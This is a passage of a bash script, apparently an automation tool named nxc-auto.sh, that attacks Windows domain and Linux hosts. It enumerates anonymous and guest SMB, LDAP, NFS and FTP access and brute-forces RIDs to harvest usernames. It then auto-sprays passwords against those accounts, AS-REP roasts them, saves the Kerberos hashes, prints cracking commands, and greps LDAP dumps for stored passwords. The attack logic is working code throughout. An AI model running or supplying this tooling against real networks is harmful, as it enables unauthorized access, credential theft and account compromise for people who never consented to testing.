                            echo -e "  - ${BRED}$share${NC}"
                            log_info "Upload file to $share:"
                            echo "smbclient //$IP/$share -U 'guest%' -c 'put local_file.txt remote_file.txt'"
                        fi
                    fi
                done
                echo ""
            fi
            
            # Suggest specific shares if found
            log_info "Connect to shares:"
            echo "$guest_output" | while read -r line; do
                clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                    share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ|WRITE|READ,WRITE)$/) {print $(i-1); exit}}')
                    share=${share#\\}
                    if [ ! -z "$share" ]; then
                        echo "smbclient -U 'guest%' //$IP/$share"
                    fi
                fi
            done
            echo ""
            
            # Suggest recursive download commands
            log_info "Download all files recursively:"
            echo "$guest_output" | while read -r line; do
                clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                    share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ|WRITE|READ,WRITE)$/) {print $(i-1); exit}}')
                    share=${share#\\}
                    if [ ! -z "$share" ] && [[ "$share" != "IPC$" ]]; then
                        echo "smbclient //$IP/$share -U 'guest%' -c 'prompt OFF;recurse ON;mget *'"
                        echo "# Or with smbget: smbget -R smb://$IP/$share -U guest%"
                    fi
                fi
            done
            echo ""
        fi
    fi
    
    # Anonymous access (domain optional)
    log_section "SMB Anonymous Access"
    if [ -n "$domain" ]; then
        print_cmd "nxc smb $IP -d \"$domain\" -u '' -p '' --shares"
        anon_output=$(nxc smb $IP -d "$domain" -u '' -p '' --shares)
    else
        print_cmd "nxc smb $IP -u '' -p '' --shares"
        anon_output=$(nxc smb $IP -u '' -p '' --shares)
    fi
    echo "$anon_output"
    
    # Check if anonymous access succeeded and suggest commands
    if echo "$anon_output" | grep -q "\[+\]" && ! echo "$anon_output" | grep -q "Error enumerating shares"; then
        if echo "$anon_output" | grep -qE "READ|WRITE"; then
            log_success "Anonymous SMB access successful! Suggested commands:"
            echo "rpcclient -U '' -N $IP"
            echo ""
            
            # Highlight writable shares specifically
            if echo "$anon_output" | grep -q "WRITE"; then
                log_error "WRITE ACCESS DETECTED as 'Anonymous' on these shares:"
                echo "$anon_output" | while read -r line; do
                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                    if [[ "$clean_line" == *"WRITE"* ]]; then
                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ,WRITE|WRITE)$/) {print $(i-1); exit}}')
                        share=${share#\\}
                        if [ ! -z "$share" ]; then
                            echo -e "  - ${BRED}$share${NC}"
                            log_info "Upload file to $share:"
                            echo "smbclient //$IP/$share -N -c 'put local_file.txt remote_file.txt'"
                        fi
                    fi
                done
                echo ""
            fi
            
            # Suggest specific shares if found
            log_info "Connect to shares:"
            echo "$anon_output" | while read -r line; do
                clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                    share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ|WRITE|READ,WRITE)$/) {print $(i-1); exit}}')
                    share=${share#\\}
                    if [ ! -z "$share" ]; then
                        echo "smbclient -U '' -N //$IP/$share"
                    fi
                fi
            done
            echo ""
            
            # Suggest recursive download commands
            log_info "Download all files recursively:"
            echo "$anon_output" | while read -r line; do
                clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                    share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ|WRITE|READ,WRITE)$/) {print $(i-1); exit}}')
                    share=${share#\\}
                    if [ ! -z "$share" ] && [[ "$share" != "IPC$" ]]; then
                        echo "smbclient //$IP/$share -N -c 'prompt OFF;recurse ON;mget *'"
                        echo "# Or with smbget: smbget -R smb://$IP/$share -U %"
                    fi
                fi
            done
            echo ""
        fi
    fi
    
    # ----------------------------
else
    log_info "Skipping Windows-specific Guest/Anonymous SMB checks (target OS: Linux)"
fi

# Skip Windows-specific anonymous RPC/AD enumeration for Linux UNLESS SMB is open (Samba)
# Modified to allow check on Linux if port 445/139 is open
if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
    log_section "RPC User Enumeration (lookupsid)"
    log_info "Attempting anonymous SID bruteforce to enumerate users..."
    # Try anonymous first
    # Try impacket-lookupsid first
    print_cmd "impacket-lookupsid -no-pass anonymous@$IP"
    lookupsid_output=$(timeout 30s impacket-lookupsid -no-pass anonymous@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-anonymous.txt)
    # Fallback to lookupsid.py if failed
    if [ ! -s nxc-enum/smb/lookupsid-anonymous.txt ]; then
        print_cmd "lookupsid.py -no-pass anonymous@$IP"
        lookupsid_output=$(timeout 30s lookupsid.py -no-pass anonymous@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-anonymous.txt)
    fi
    
    # If anonymous failed to find users, try guest
    if ! echo "$lookupsid_output" | grep -q "SidTypeUser"; then
        log_warning "Anonymous lookupsid failed, trying with 'guest' account..."
        print_cmd "impacket-lookupsid -no-pass guest@$IP"
        lookupsid_output=$(timeout 30s impacket-lookupsid -no-pass guest@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-guest.txt)
        if [ ! -s nxc-enum/smb/lookupsid-guest.txt ]; then
            print_cmd "lookupsid.py -no-pass guest@$IP"
            lookupsid_output=$(timeout 30s lookupsid.py -no-pass guest@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-guest.txt)
        fi
        if echo "$lookupsid_output" | grep -q "SidTypeUser"; then
             log_success "Successfully enumerated users via 'guest' account!"
             # combine outputs for parsing later
             cat nxc-enum/smb/lookupsid-guest.txt >> nxc-enum/smb/lookupsid-anonymous.txt
        fi
    fi
    echo "$lookupsid_output"
    
    # Check if lookupsid found users
    if echo "$lookupsid_output" | grep -q "SidTypeUser\|SidTypeGroup"; then
        log_success "Successfully enumerated users/groups via RPC!"
        log_info "Results saved to: ${BWHITE}nxc-enum/smb/lookupsid-anonymous.txt${NC}"
        echo ""
        
        # Automatically extract and save usernames
        timestamp=$(date +%Y%m%d_%H%M%S)
        users_file="nxc-enum/smb/users_${timestamp}.txt"
        grep 'SidTypeUser' nxc-enum/smb/lookupsid-anonymous.txt | awk -F'\\' '{print $2}' | awk '{print $1}' | grep -v '\$$' > "$users_file"
        
        log_success "Extracted usernames saved to: ${BWHITE}$users_file${NC}"
        log_info "Found ${BGREEN}$(wc -l < "$users_file")${NC} users (excluding machine accounts)"
        echo ""
        log_info "View users:"
        echo "cat $users_file"
        echo ""
        log_info "Use for password spraying:"
        echo "nxc smb $IP -u $users_file -p 'Password123' --continue-on-success"
        echo ""
        
        # Try alternative enumeration tools if lookupsid didn't find users
    else
        log_warning "lookupsid.py didn't find users, trying alternative tools..."
    fi
    
    # Alternative Tool 1: NetExec RID Brute (anonymous & guest)
    log_section "NetExec RID Brute"
    log_info "Trying NetExec RID Brute (anonymous)"
    print_cmd "nxc smb $IP -u '' -p '' --rid-brute"
    nxc_rid_output=$(timeout 60s nxc smb $IP -u '' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-anonymous.txt)
    echo "$nxc_rid_output"

    log_info "Trying NetExec RID Brute (guest)"
    if [ -n "$domain" ]; then
        print_cmd "nxc smb $IP -d \"$domain\" -u 'guest' -p '' --rid-brute"
        nxc_rid_guest_output=$(timeout 60s nxc smb $IP -d "$domain" -u 'guest' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-guest.txt)
    else
        print_cmd "nxc smb $IP -u 'guest' -p '' --rid-brute"
        nxc_rid_guest_output=$(timeout 60s nxc smb $IP -u 'guest' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-guest.txt)
    fi
    echo "$nxc_rid_guest_output"
    
    # Alternative Tool 2: rpcclient enumdomusers
    log_section "rpcclient Enumeration"
    log_info "Trying rpcclient enumdomusers (anonymous)"
    print_cmd "rpcclient -U '' -N $IP -c 'enumdomusers'"
    rpcclient_output=$(rpcclient -U '' -N $IP -c 'enumdomusers' 2>/dev/null | tee nxc-enum/smb/rpcclient-enumdomusers.txt)
    echo "$rpcclient_output"
    
    # Alternative Tool 3: samrdump
    log_section "samrdump Enumeration"
    log_info "Trying samrdump (anonymous)"
    print_cmd "impacket-samrdump $IP"
    samrdump_output=$(timeout 15s impacket-samrdump $IP 2>/dev/null | tee nxc-enum/smb/samrdump-anonymous.txt)
    if [ ! -s nxc-enum/smb/samrdump-anonymous.txt ]; then
         print_cmd "samrdump.py $IP"
         samrdump_output=$(timeout 15s samrdump.py $IP 2>/dev/null | tee nxc-enum/smb/samrdump-anonymous.txt)
    fi
    echo "$samrdump_output"
    
    # Alternative Tool 4: enum4linux (if installed)
    if command -v enum4linux &> /dev/null; then
        log_section "enum4linux Enumeration"
        log_info "Trying enum4linux (anonymous)"
        print_cmd "enum4linux -U $IP"
        timeout 30s enum4linux -U $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-users.txt
    fi

    # Alternative Tool 5: enum4linux-ng (if installed)
    if command -v enum4linux-ng &> /dev/null; then
        log_section "enum4linux-ng Enumeration"
        log_info "Trying enum4linux-ng (anonymous - MAX INFO)"
        # -A (All), -R (RID Cycle), -d (Detailed)
        print_cmd "enum4linux-ng -A -R -d $IP"
        timeout 600s enum4linux-ng -A -R -d $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-ng-anonymous.txt
    fi
    
    # Check if we got users from any tool and create users file if not already created
    users_file_count=$(ls nxc-enum/smb/users_*.txt 2>/dev/null | wc -l)
    if [ "$users_file_count" -eq 0 ]; then
        # Try to extract from alternative tools
        timestamp=$(date +%Y%m%d_%H%M%S)
        users_file="nxc-enum/smb/users_${timestamp}.txt"
        
        # Try nxc output
        if echo "$nxc_rid_output" | grep -q "SidTypeUser"; then
            echo "$nxc_rid_output" | grep "SidTypeUser" | awk -F'\\\\' '{print $2}' | awk '{print $1}' | grep -v '\$$' >> "$users_file"
        fi
        
        if echo "$nxc_rid_guest_output" | grep -q "SidTypeUser"; then
            echo "$nxc_rid_guest_output" | grep "SidTypeUser" | awk -F'\\\\' '{print $2}' | awk '{print $1}' | grep -v '\$$' >> "$users_file"
        fi
        
        # Try rpcclient output
        if [ ! -s "$users_file" ] && echo "$rpcclient_output" | grep -q "user:"; then
            echo "$rpcclient_output" | grep "user:" | awk -F'[][]' '{print $2}' > "$users_file"
        fi
        
        # If we got users, show them
        if [ -s "$users_file" ]; then
            log_success "Extracted usernames from alternative tools: ${BWHITE}$users_file${NC}"
            log_info "Found ${BGREEN}$(wc -l < "$users_file")${NC} users"
        fi
    else
        # Users file already exists from lookupsid
        users_file=$(ls -t nxc-enum/smb/users_*.txt 2>/dev/null | head -n1)
    fi

    # Fallback to common usernames if NO users were discovered via any method
    if [ -z "$user" ] && { [ ! -s "$users_file" ] || [ -z "$users_file" ]; }; then
        log_warning "No users discovered via anonymous enumeration. Falling back to common service accounts..."
        timestamp=$(date +%Y%m%d_%H%M%S)
        users_file="nxc-enum/smb/users_fallback_${timestamp}.txt"
        printf "Administrator\nGuest\nbitbucket\njenkins\ngitlab\nsvc_sql\nsvc_domain\nadmin\nuser\n" > "$users_file"
        log_info "Created fallback user list: ${BWHITE}$users_file${NC}"
    fi

    # Auto-adopt discovered users if no user argument was provided
    if [ -z "$user" ] && [ -n "$users_file" ] && [ -s "$users_file" ]; then
        log_success "Auto-adopting discovered username list for further checks..."
        # Convert to absolute path to avoid any cd issues
        user=$(readlink -f "$users_file")
        
        # Re-build flags with the new user list
        if [ -n "$domain" ]; then DOMAIN_FLAG="-d $domain"; else DOMAIN_FLAG=""; fi
        
        # If password was provided, utilize it (Spray), otherwise default to empty (Blank Spray)
        if [ -n "$pass" ]; then
             USER_FLAG="-u $user -p $pass"
        else
             USER_FLAG="-u $user -p ''"
        fi
        log_info "User flag updated to: ${BWHITE}$USER_FLAG${NC}"
        log_warning "Note: This will attempt authentication with the extracted user list."
    fi
    
    # Continue with AS-REP roasting if we have a users file
    if [ -n "$users_file" ] && [ -s "$users_file" ]; then

        # AS-REP Roasting with GetNPUsers.py
        log_section "AS-REP Roasting"

        # Use global domain if available, otherwise try to extract it from discovery files
        if [ -z "$domain" ] || [ "$domain" == "DOMAIN" ]; then
            domain=$(grep -oP '(?<=domain:)[^\)]+' nxc-enum/smb/*anon*.txt 2>/dev/null | head -n1 | tr -d ' ')
            [ -z "$domain" ] && domain=$(echo "$lookupsid_output" | grep -oP 'VULNNET-RST|[A-Z]+-[A-Z]+' | head -n1)
        fi

        if [ -n "$domain" ] && [ "$domain" != "DOMAIN" ]; then
            log_info "Using domain: ${BWHITE}$domain${NC}"

            # Check if Kerberos port is open to avoid long timeouts
            if ! check_port $IP 88 "Kerberos"; then
                log_warning "Port 88 (Kerberos) closed. Skipping AS-REP Roasting and Kerbrute checks."
            else
                log_info "Attempting AS-REP Roasting (this can take a while if port 88 is filtered)..."
                print_cmd "impacket-GetNPUsers \"${domain}/\" -usersfile \"$users_file\" -no-pass -dc-ip $DC_IP"
                # Apply a 2-minute timeout to prevent infinite hanging
                getnpusers_output=$(timeout 120s impacket-GetNPUsers "${domain}/" -usersfile "$users_file" -no-pass -dc-ip $DC_IP 2>/dev/null)

                if [ -z "$getnpusers_output" ] || [[ "$getnpusers_output" == *"Connection refused"* ]]; then
                    print_cmd "GetNPUsers.py \"${domain}/\" -usersfile \"$users_file\" -no-pass -dc-ip $DC_IP"
                    getnpusers_output=$(timeout 120s GetNPUsers.py "${domain}/" -usersfile "$users_file" -no-pass -dc-ip $DC_IP 2>/dev/null)
                fi

                if [ -n "$getnpusers_output" ]; then
                    echo "$getnpusers_output" | tee nxc-enum/smb/asrep-getnpusers.txt
                else
                    log_warning "AS-REP Roasting timed out or failed to produce output."
                fi

                # Check if any AS-REP roastable users were found
                if echo "$getnpusers_output" | grep -q '\$krb5asrep\$'; then
                    # Extract just the hashes to a clean file
                    grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt > nxc-enum/smb/asrep-hashes.txt

                    # Extract vulnerable usernames
                    vulnerable_users=$(grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt | grep -oP '\$krb5asrep\$23\$\K[^@]+' | tr '\n' ', ' | sed 's/,$//')

                    log_success "AS-REP Roastable users found: ${BRED}$vulnerable_users${NC}"
                    log_info "Full output: ${BWHITE}nxc-enum/smb/asrep-getnpusers.txt${NC}"
                    log_info "Clean hashes: ${BWHITE}nxc-enum/smb/asrep-hashes.txt${NC}"
                    echo ""
                    log_info "Crack with John the Ripper:"
                    echo "john --wordlist=/usr/share/wordlists/rockyou.txt nxc-enum/smb/asrep-hashes.txt"
                    echo ""
                    log_info "Or with Hashcat:"
                    echo "hashcat -m 18200 nxc-enum/smb/asrep-hashes.txt /usr/share/wordlists/rockyou.txt"
                    echo ""
                    log_info "Show cracked passwords:"
                    echo "john --show nxc-enum/smb/asrep-hashes.txt"
                fi

                # --- Additional User Attacks ---
                log_section "Additional User Attacks"

                # 1. Kerbrute User Enumeration (Validation)
                # Check if kerbrute is in PATH, if not check distinct location
                KERBRUTE_CMD="kerbrute"
                if ! command -v kerbrute &> /dev/null; then
                     if [ -f "$HOME/.local/bin/kerbrute" ]; then
                         KERBRUTE_CMD="$HOME/.local/bin/kerbrute"
                     elif [ -f "/usr/local/bin/kerbrute" ]; then
                         KERBRUTE_CMD="/usr/local/bin/kerbrute"
                     fi
                fi

                if command -v "$KERBRUTE_CMD" &> /dev/null || [ -f "$KERBRUTE_CMD" ]; then
                     log_info "Kerbrute User Validation"
                     if [ -n "$pass" ]; then
                         log_info "Password provided ('$pass'), running Password Spray instead of just User Enumeration..."
                         print_cmd "$KERBRUTE_CMD passwordspray -d \"$domain\" --dc $IP \"$users_file\" \"$pass\""
                         timeout 300s "$KERBRUTE_CMD" passwordspray -d "$domain" --dc $IP "$users_file" "$pass" 2>/dev/null | tee nxc-enum/smb/kerbrute-spray.txt
                     else
                         print_cmd "$KERBRUTE_CMD userenum -d \"$domain\" --dc $IP \"$users_file\""
                         timeout 60s "$KERBRUTE_CMD" userenum -d "$domain" --dc $IP "$users_file" 2>/dev/null | tee nxc-enum/smb/kerbrute-validation.txt
                     fi
                else
                     log_warning "kerbrute not found (checked PATH and ~/.local/bin). Skipping user validation."
                fi

                # 2. NetView Enumeration (Network/Session info)
                log_info "NetView Network Enumeration"
                # NetView usually needs a valid user/pass, checking if we have one, otherwise runs limited
                if [ -n "$user" ] && [ -n "$pass" ]; then
                     print_cmd "impacket-netview \"$domain\"/\"$user\":\"$pass\"@$IP"
                     impacket-netview "$domain"/"$user":"$pass"@$IP 2>/dev/null | tee nxc-enum/smb/netview-auth.txt
                else
                     # Try with empty/anonymous if no creds yet (likely fails but worth a shot if Null session allowed)
                     print_cmd "impacket-netview \"$domain\"/''@$IP -no-pass"
                     impacket-netview "$domain"/''@$IP -no-pass 2>/dev/null | tee nxc-enum/smb/netview-anon.txt
                fi

                # 3. GetTGT (Check for TGT acquisition)
                log_info "GetTGT Check"
                echo "[*] TGT acquisition requires a valid password/hash."
                echo "[*] If you crack an AS-REP hash, get a TGT with:"
                echo "    impacket-getTGT $domain/<user>:<password>"
                echo ""
            fi
            # --- End New Checks ---
        else
            log_warning "Could not auto-detect domain name"
            log_info "Run manually with: GetNPUsers.py DOMAIN/ -usersfile $users_file -no-pass -dc-ip $DC_IP"
            log_info "Or re-run script with: ./nxc-auto.sh -i $IP -d DOMAIN"
        fi
        echo ""
    fi
else
    log_info "Skipping Windows-specific anonymous RPC/AD enumeration (target OS: Linux)"
fi


            # LDAP anonymous checks (Windows-specific)
            if [ "$os_type" = "windows" ]; then
                log_section "LDAP Anonymous Access"
                if ! check_port $IP 389 "LDAP"; then
                    log_warning "Port 389 (LDAP) seems closed. Skipping LDAP Anonymous Access."
                    ldap_output=""
                else
                    log_info "Attempting LDAP Anonymous Access..."
                    print_cmd "nxc ldap $IP -u '' -p '' --timeout 15"
                    ldap_output=$(timeout 30s nxc ldap $IP -u '' -p '' --timeout 15)
                    echo "$ldap_output"
                fi

                # Check if anonymous LDAP access succeeded (via nxc OR manual check)
                if [ -n "$ldap_output" ]; then
                    print_cmd "ldapsearch -x -H ldap://$IP -s base namingContexts"
                    verify_ldap_anon=$(timeout 15s ldapsearch -x -H ldap://$IP -s base namingContexts 2>/dev/null)
                else
                    verify_ldap_anon=""
                fi

                if echo "$ldap_output" | grep -q "\[+\]" || echo "$verify_ldap_anon" | grep -q "namingContexts"; then
                    log_success "Anonymous LDAP access verified! Attempting to dump data..."

                    # Determine Base DN
                    if [ -n "$domain" ]; then
                        base_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
                    else
                        log_info "Domain not specified, attempting to fetch naming contexts..."
                        # Try to fetch defaultNamingContext
                        base_dn=$(echo "$verify_ldap_anon" | grep "defaultNamingContext:" | awk '{print $2}')

                        # Fallback: if defaultNamingContext is empty, grab the first namingContexts that starts with DC=
                        if [ -z "$base_dn" ]; then
                             base_dn=$(echo "$verify_ldap_anon" | grep "namingContexts:" | awk '{print $2}' | grep "^DC=" | head -n 1)
                        fi
                    fi

                    if [ -n "$base_dn" ]; then
                        log_info "Using Base DN: ${BWHITE}$base_dn${NC}"
                        log_info "Dumping all objects..."
                        print_cmd "ldapsearch -x -H ldap://$IP -b \"$base_dn\" -s sub \"(objectClass=*)\""
                        ldapsearch -x -H ldap://$IP -b "$base_dn" -s sub "(objectClass=*)" > nxc-enum/ldap/ldap-dump-anonymous.txt

                        if [ -s nxc-enum/ldap/ldap-dump-anonymous.txt ]; then
                            log_success "Full LDAP dump saved to: ${BWHITE}nxc-enum/ldap/ldap-dump-anonymous.txt${NC}"

                            # Extract users
                            grep "sAMAccountName" nxc-enum/ldap/ldap-dump-anonymous.txt | awk '{print $2}' | sort | uniq > nxc-enum/ldap/ldap-users-anonymous.txt
                            log_info "Extracted ${BGREEN}$(wc -l < nxc-enum/ldap/ldap-users-anonymous.txt)${NC} users to: ${BWHITE}nxc-enum/ldap/ldap-users-anonymous.txt${NC}"

                            # Check for sensitive info in descriptions
                            log_info "Searching for sensitive info in descriptions..."
                            grep -iE "description|info|comment" nxc-enum/ldap/ldap-dump-anonymous.txt | grep -iE "pass|pwd|secret|admin|welcome" > nxc-enum/ldap/ldap-sensitive-descriptions.txt
                            if [ -s nxc-enum/ldap/ldap-sensitive-descriptions.txt ]; then
                                log_warning "FOUND POTENTIAL SECRETS in LDAP descriptions!"
                                cat nxc-enum/ldap/ldap-sensitive-descriptions.txt
                            fi
                        else
                            log_error "LDAP dump file is empty. Anonymous bind allowed but maybe no read access?"
                        fi
                        log_info "Suggestion: cat nxc-enum/ldap/ldap-dump-anonymous.txt | grep description"
                    else
                        log_warning "Could not determine Base DN automatically."
                        log_info "Try manual enumeration:"
                        echo "ldapsearch -x -H ldap://$IP -s base namingContexts"
                    fi
                    echo ""
                fi

                log_section "LDAP Guest Access"
                # Try with guest account
                if ! check_port $IP 389 "LDAP"; then
                    log_warning "Port 389 (LDAP) seems closed. Skipping LDAP Guest Access."
                    ldap_guest_output=""
                else
                    log_info "Attempting LDAP Guest Access..."
                    if [ -n "$domain" ]; then
                        print_cmd "nxc ldap $IP -d \"$domain\" -u 'guest' -p '' --timeout 15"
                        ldap_guest_output=$(timeout 30s nxc ldap $IP -d "$domain" -u 'guest' -p '' --timeout 15)
                    else
                        print_cmd "nxc ldap $IP -u 'guest' -p '' --timeout 15"
                        ldap_guest_output=$(timeout 30s nxc ldap $IP -u 'guest' -p '' --timeout 15)
                    fi
                    echo "$ldap_guest_output"
                fi

                if echo "$ldap_guest_output" | grep -q "\[+\]"; then
                    log_success "Guest LDAP access successful! Attempting to dump data..."

                    # Determine Base DN (Similar logic to anonymous)
                    if [ -n "$domain" ]; then
                        base_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
                    else
                        log_info "Domain not specified, attempting to fetch defaultNamingContext..."
                        # Try to fetch defaultNamingContext via guest
                        # Note: ldapsearch needs bind DN for guest: -D "guest" -w "" usually works if guest is enabled
                        base_dn=$(ldapsearch -x -H ldap://$IP -D "guest" -w "" -s base namingContexts 2>/dev/null | grep "defaultNamingContext:" | awk '{print $2}')

                        if [ -z "$base_dn" ]; then
                             base_dn=$(ldapsearch -x -H ldap://$IP -D "guest" -w "" -s base namingContexts 2>/dev/null | grep "namingContexts:" | awk '{print $2}' | grep "^DC=" | head -n 1)
                        fi
                    fi

                    if [ -n "$base_dn" ]; then
                        log_info "Using Base DN: ${BWHITE}$base_dn${NC}"
                        log_info "Dumping all objects (as Guest)..."
                        # Bind as guest
                        print_cmd "ldapsearch -x -H ldap://$IP -D \"guest\" -w \"\" -b \"$base_dn\" -s sub \"(objectClass=*)\""
                        ldapsearch -x -H ldap://$IP -D "guest" -w "" -b "$base_dn" -s sub "(objectClass=*)" > nxc-enum/ldap/ldap-dump-guest.txt

                        if [ -s nxc-enum/ldap/ldap-dump-guest.txt ]; then
                            log_success "Full LDAP dump saved to: ${BWHITE}nxc-enum/ldap/ldap-dump-guest.txt${NC}"

                            # Extract users
                            grep "sAMAccountName" nxc-enum/ldap/ldap-dump-guest.txt | awk '{print $2}' | sort | uniq > nxc-enum/ldap/ldap-users-guest.txt
                            log_info "Extracted ${BGREEN}$(wc -l < nxc-enum/ldap/ldap-users-guest.txt)${NC} users to: ${BWHITE}nxc-enum/ldap/ldap-users-guest.txt${NC}"

                            # Check for sensitive info
                            log_info "Searching for sensitive info in descriptions..."
                            grep -iE "description|info|comment" nxc-enum/ldap/ldap-dump-guest.txt | grep -iE "pass|pwd|secret|admin|welcome" > nxc-enum/ldap/ldap-sensitive-descriptions-guest.txt
                            if [ -s nxc-enum/ldap/ldap-sensitive-descriptions-guest.txt ]; then
                                log_warning "FOUND POTENTIAL SECRETS in LDAP descriptions (Guest)!"
                                cat nxc-enum/ldap/ldap-sensitive-descriptions-guest.txt
                            fi
                        else
                            log_error "LDAP dump file is empty. Guest bind allowed but maybe no read access?"
                        fi
                        log_info "Suggestion: cat nxc-enum/ldap/ldap-dump-guest.txt | grep description"
                    else
                        log_warning "Could not determine Base DN automatically via Guest."
                    fi
                    echo ""
                fi
            fi
log_section "NFS Enumeration"

# 1. NetExec NFS enumeration
print_cmd "nxc nfs $IP --shares"
nfs_output=$(unbuffer nxc nfs $IP --shares 2>/dev/null | tee nxc-enum/smb/nfs-shares.txt)
echo "$nfs_output"

# 2. showmount enumeration
if command -v showmount &> /dev/null; then
    log_info "showmount -e $IP"
    print_cmd "showmount -e $IP"
    showmount_output=$(showmount -e $IP 2>/dev/null | tee nxc-enum/smb/nfs-showmount.txt)
    echo "$showmount_output"
else
    showmount_output=""
fi

# 3. rpcinfo (Bonus: reveals if NFS/mountd are running)
if command -v rpcinfo &> /dev/null; then
    log_info "rpcinfo -p $IP"
    print_cmd "rpcinfo -p $IP"
    rpcinfo -p $IP 2>/dev/null | tee nxc-enum/smb/nfs-rpcinfo.txt
fi

# Check for NFS shares and suggest mount commands from both tools
if echo "$nfs_output" | grep -qE "r--|rw-|rwx" || echo "$showmount_output" | grep -q "^/"; then
    log_success "NFS shares found! Suggested mount commands:"
    echo "sudo mkdir -p /mnt/nfs"
    
    # Track shares we already suggested to avoid duplicates
    suggested_shares=""
    
    # Process nxc output
    if echo "$nfs_output" | grep -qE "r--|rw-|rwx"; then
        while read -r line; do
            clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
            nfs_share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^\//) {print $i; exit}}'| head -n1)
            if [ -n "$nfs_share" ]; then
                log_info "Mount $nfs_share:"
                echo "sudo mount -t nfs $IP:$nfs_share /mnt/nfs"
                echo "# Or with specific version: sudo mount -t nfs -o vers=3 $IP:$nfs_share /mnt/nfs"
                suggested_shares="$suggested_shares $nfs_share"
            fi
        done < <(echo "$nfs_output" | grep -E "r--|rw-|rwx")
    fi
    
    # Process showmount output (for extra shares or if nxc failed)
    if [ -n "$showmount_output" ]; then
        while read -r line; do
            nfs_share=$(echo "$line" | awk '{print $1}')
            if [ -n "$nfs_share" ] && [[ "$nfs_share" == /* ]] && ! echo "$suggested_shares" | grep -q "$nfs_share"; then
                log_info "Mount $nfs_share:"
                echo "sudo mount -t nfs $IP:$nfs_share /mnt/nfs"
                echo "# Or with specific version: sudo mount -t nfs -o vers=3 $IP:$nfs_share /mnt/nfs"
                suggested_shares="$suggested_shares $nfs_share"
            fi
        done < <(echo "$showmount_output" | grep "^/")
    fi
    echo ""
fi

# FTP Anonymous Access
if [ "$os_type" = "windows" ] || check_port $IP 21; then
    log_section "FTP Anonymous Access"
    if check_port $IP 21; then
        print_cmd "nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 30"
        ftp_output=$(timeout 60s nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 30)
        echo "$ftp_output"

        # Check if anonymous FTP access succeeded and suggest commands
        if echo "$ftp_output" | grep -q "\[+\]"; then
            log_success "Anonymous FTP access successful! Suggested commands:"
            echo "ftp $IP"
            echo "# Username: anonymous"
            echo "# Password: anonymous"
            echo ""
            log_info "Or use lftp for better features:"
            echo "lftp -u anonymous,anonymous $IP"
            echo ""
            log_info "Download all files recursively:"
            echo "wget -r ftp://anonymous:anonymous@$IP/"
            echo ""
        fi
    else
        log_warning "FTP (Port 21) seems closed. Skipping FTP Anonymous Access."
    fi
fi
}

# Run anonymous enumeration early ONLY if no credentials were provided
if [ -z "$user" ]; then
    run_anonymous_enumeration
fi



# Helper function to run nxc and suggest login command if successful
check_and_suggest() {
    service=$1
    shift
    log_info "Checking $service..."
    # Print the command before execution
    print_cmd "$@"
    # Run the command and capture output
    output=$("$@")

    echo "$output"
    
    # Auto-fix Schema Mismatch and Retry
    if echo "$output" | grep -q "Schema mismatch detected"; then
        log_warning "Schema mismatch detected! Attempting auto-fix (deleting old DBs) and RETRYING..."
        rm -f ~/.nxc/workspaces/default/*.db 2>/dev/null
        rm -f /root/.nxc/workspaces/default/*.db 2>/dev/null
        
        log_info "Retrying command..."
        # Retry the command
        print_cmd "$@"
        output=$("$@")
        echo "$output"
    fi

    # Try different auth combinations if failed for SMB/WinRM/WMI
    if [[ "$service" == "smb" || "$service" == "winrm" || "$service" == "wmi" ]] && ! echo "$output" | grep -q "+"; then
         
         # Helper to strip domain for retries
         local base_args=()
         local skip_next=false
         for arg in "$@"; do
             if [ "$skip_next" = true ]; then skip_next=false; continue; fi
             if [ "$arg" = "-d" ]; then skip_next=true; continue; fi
             base_args+=("$arg")
         done

         # 1. Try WITHOUT domain flag if one was provided
         if [[ "$*" == *"-d "* ]]; then
             log_warning "Auth failed with domain. Retrying WITHOUT domain flag..."
             print_cmd "${base_args[@]}"
             output=$("${base_args[@]}")
             echo "$output"
         fi

         # 2. Try with --local-auth if still failed
         if ! echo "$output" | grep -q "+"; then
             log_warning "Still failed. Retrying with --local-auth (stripping domain)..."
             print_cmd "${base_args[@]} --local-auth"
             output=$("${base_args[@]}" --local-auth)
             echo "$output"
             
             # If local auth worked, we should remember to use it for future suggestions in this session
             if echo "$output" | grep -q "+"; then
                 USE_LOCAL_AUTH="true"
             fi
         fi
    fi
    
    # Harvest any successes found in this tool's output
